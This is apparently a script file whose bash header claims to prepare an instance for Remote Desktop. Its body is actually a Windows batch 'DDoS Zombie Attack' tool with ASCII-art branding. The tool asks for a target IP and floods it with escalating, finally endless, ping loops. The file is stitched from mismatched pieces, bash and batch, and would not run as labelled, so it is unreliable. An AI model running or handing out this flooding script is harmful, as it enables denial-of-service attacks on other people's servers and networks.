#! /bin/bash

# Make Instance Ready for Remote Desktop or RDP

b='\033[1m'
r='\E[31m'
g='\E[32m'
c='\E[36m'
endc='\E[0m'
enda='\033[0m'

clear

# Branding

@shift /0
@echo off
color 1a
Title DDoS Zombie Attack V1.0
cls
mode 132,57
color 0a
echo.
echo.
echo 88888888888888888888888888888888888888888888888888888888888P"""""""""""""""88888888888888888888888888888888888888888888888888888888
echo 8888888888888888888888888888888888888888888888888P""°```````````````````````````'"""88888888888888888888888888888888888888888888888
echo 888888888888888888888888888888888888888888P"`````````````````````````````````````````````"78888888888888888888888888888888888888888
echo 8888888888888888888888888888888888888888P°``````````````````````````````````````````````````788888888888888888888888888888888888888
echo 888888888888888888888888888888888888888``````````````````````````````````````````````````````'8888888888888888888888888888888888888
echo 88888888888888888888888888888888888888[```````````````````````````````````````````````````````'888888888888888888888888888888888888
echo 8888888888888888888888888888888888888P``````````````````````````````````````````````````````````88888888888888888888888888888888888
echo 8888888888888888888888888888888888888°``````````````````````````````````````````````````````````78888888888888888888888888888888888
echo 8888888888888888888888888888888888888`````````________`````````````````````````________,````````]8888888888888888888888888888888888
echo 888888888888888888888888888888888888°`````.J888888888888__`````````````````.J888888888888L,`````]8888888888888888888888888888888888
echo 88888888888888888888888888888888888P````_/°````8888_J"788888_```````````J888888"LJ888P````'"L````8888888888888888888888888888888888
echo 88888888888888888888888888888888888[```'```````````"88L,788888,````````J8888P__8P"``````````'````8888888888888888888888888888888888
echo 88888888888888888888888888888888888[``````````````````'88LJ788°````````78"\J8P"``````````````````7888888888888888888888888888888888
echo 88888888888888888888888888888888888°````````````````````788L````````````.J88°````````````````````]888888888888888888888888888888888
echo 88888888888888888888888888888888888```````````````````````'888,````````]8"```````````````````````]888888888888888888888888888888888
echo 88888888888888888888888888888888888````````__88888888L_````]888````````'`````._J88888888L,```````]888888888888888888888888888888888
echo 88888888888888888888888888888888888``````J8888888888888888,'888[``````````.J888888888888888L,````]888888888888888888888888888888888
echo 88888888888888888888888888888888888````8888888888888888888°`888[```````````8888888888888888P""8888888888888888888888888888888888888
echo 88888888888888888888888888888888888```]"""°````````````````]888[`````````````````````````````````]888888888888888888888888888888888
echo 88888888888888888888888888888888888````````````````````````]888[`````````````````````````````````]888888888888888888888888888888888
echo 88888888888888888888888888888888888L```````````````````````]888[`````````````````````````````````]888888888888888888888888888888888
echo 8888888888888888888888888888888888888,`````````````````````8888[`````````````````````````````````J888888888888888888888888888888888
echo 88888888888888888888888888888888888888,```````````````````.8888[````````````````````````````````]8888888888888888888888888888888888
echo 88888888888888888888888888888888888L`'8,`````````````````.88888[``````````````````````````````]888888888888888888888888888888888888
echo 8888888888888888888888888888888888888`'888__________J`.88888888`````````'"",```````````````_JP`]88888888888888888888888888888888888
echo 8888888888888888888888888888888888888L`788]88[````````]888`]888````````````]`````'""888888"88`]888888888888888888888888888888888888
echo 88888888888888888888888888888888888888[`"8,'88L````````7[``]88P``````````````````````.88P`]8[`J888888888888888888888888888888888888
echo 888888888888888888888888888888888888888```8,'888,``````````'88[`````````````````````]88P`]8[`]8888888888888888888888888888888888888
echo 8888888888888888888888888888888888888888,`'7_,88888_,```````888,````.J8[`````````._888°`.8°`.88888888888888888888888888888888888888
echo 88888888888888888888888888888888888888888[``78,]8888888888888888888888888,```_8888888``J8°``888888888888888888888888888888888888888
echo 888888888888888888888888888888888888888888[```8L,`'788888888888P°``"88888888888888"°.J88``.8888888888888888888888888888888888888888
echo 8888888888888888888888888888888888888888888[```888[````'788888P``````788888888"``````J°``]88888888888888888888888888888888888888888
echo 88888888888888888888888888888888888888888888L,``7888_``````````'""""""``````````````8°``J888888888888888888888888888888888888888888
echo 8888888888888888888888888888888888888888888888,``'888878``````````````````````````.8```J8888888888888888888888888888888888888888888
echo 88888888888888888888888888888888888888888888888,``'888````'""`_______,```````````J"``]888888888888888888888888888888888888888888888
echo 888888888888888888888888888888888888888888888888[``'8L`````````888888[``````````8```J8888888888888888888888888888888888888888888888
echo 88888888888888888888888888888888888888888888888888,`]8,````````]8888[``````````P```J88888888888888888888888888888888888888888888888
echo 888888888888888888888888888888888888888888888888888,``°````````88888L````````````J8888888888888888888888888888888888888888888888888
echo 8888888888888888888888888888888888888888888888888888L_````````8888P88[``````````J88888888888888888888888888888888888888888888888888
echo 888888888888888888888888888888888888888888888888888888L```````8888888[`````````8888888888888888888888888888888888888888888888888888
echo 8888888888888888888888888888888888888888888888888888888L``````'888888°```````J88888888888888888888888888888888888888888888888888888
echo 888888888888888888888888888888888888888888888888888888888L`````88888[``````]8888888888888888888888888888888888888888888888888888888
echo 88888888888888888888888888888888888888888888888888888888888_```]8888[```_J888888888888888888888888888888888888888888888888888888888
echo 88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
echo 88888888888888888888888888888888888````88°```78```]````````]8888888P`````8888````````'88````````]8888888888888888888888888888888888
echo 88888888888888888888888888888888888[```8P````]P```J````.___J8888888``````]888```.8,```]8````.___J8888888888888888888888888888888888
echo 88888888888888888888888888888888888[```8[````][``.8````'"""7888888P``._```788```'8°```88````'"""78888888888888888888888888888888888
echo 888888888888888888888888888888888888,``'``],`````]8````````]888888°``]8[```88````````'88````````]8888888888888888888888888888888888
echo 888888888888888888888888888888888888L`````8[`````J8````]888888888°`````````]8```]8````88````]88888888888888888888888888888888888888
echo 8888888888888888888888888888888888888`````8[````]88````````]8888P```.__,```]8```]8[```88````````]8888888888888888888888888888888888
echo 8888888888888888888888888888888888888_____8L____888________J8888L___J888____L___J8L___88________J8888888888888888888888888888888888
echo 88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
echo 888888888888888888"""""788P""""88P"""88P""``""788P"""78P"""7""""88P"""7P"""""88"""""788P"°``""888"""78""""888""``'"8888888888888888
echo 88888888888888888[`````'88[`````8[```8[````````78[````8[```],```]8```.8[`````88`````]8`````````7L```]8````]P````````888888888888888
echo 88888888888888888°``````]8[`````][```8````8[```]8[````][```]8,``````]88[`````88`````]P```]88````8```]8````]````"88__888888888888888
echo 8888888888888888P```]```]8[``````[```8````8[```]8[````'°```]88,`````888[```,`"``.```][```]88````8```]8````]L``````"7888888888888888
echo 8888888888888888°```"````8[```8,`````8````8[```]8[``]8`````]888````8888[```[````]```][```]88````8```]8````]888L,````'88888888888888
echo 8888888888888888`````````][```78`````8,```8[```]8[``]8,````]888````8888[```8````8```]L```]8P````8```]8````]```'88````88888888888888
echo 888888888888888[```]8L````[```]8[````8L````````J8[``]8[````]888````8888[```8,``]8```]8_```````.88L```````J8L```````.888888888888888
echo 88888888888888888888888_88888J88888LJ8888____J8888J8888L88J88888J8J88888JLJ88_J88LJL88888____888888____J888888____88888888888888888
echo 88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
echo 8888888 = Created By : Park Ki Young = 8888888888888888888888888888888888888888888888888888 = Created By : Park Ki Young = 88888888
echo 88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
echo.
echo ###################################################################################################################################
set /p m=IP Targets(Example : 74.125.68.147)=
echo ###################################################################################################################################
echo.
echo ***********************************************************************************************************************************
echo $$$$$$$$$$$$$$$$$$$$$$$ (Attacking IP : [%m%] - {%Random%} - [%date%] - [%time%]) $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
echo ***********************************************************************************************************************************
msg /w * The DDoS remember having to wear a good connection and stable, otherwise it will be a long DDoS !!!
mode 62,50
cls
setlocal
 
set COUNT=0
set MAXCOUNT=100
set SECONDS=1
color 1f
msg * Easy Attack
:LOOP
if /i "%COUNT%" equ "%MAXCOUNT%" goto :EXIT
set /a count+=1
ping %m% -i 255 -n 1 >nul
echo Set {%COUNT%} Packets [Zombie Attacking Server %m%]
goto :LOOP
 
:WAIT
ping -n %SECONDS% 127.0.0.1 > nul
ping -n %SECONDS% 127.0.0.1 > nul
goto :EOF
 
:EXIT
msg * Medium Attack
set MX=500
color 1a
:OK
if /i "%COUNT%" equ "%MX%" goto :wew
set /a count+=1
ping %m% -i 255 -n 1 >nul
ping %m% -i 255 -n 1 >nul
echo Set {%COUNT%} Packets [Zombie Attacking Server %m%]
goto :OK
 
:wew
msg * Hard Attack
color 1c
:Hac
set /a count+=1
ping %m% -i 255 -n 1 >nul
ping %m% -i 255 -n 1 >nul
ping %m% -i 255 -n 1 >nul
echo Set {%COUNT%} Packets [Zombie Attacking Server %m%]
goto :Hac
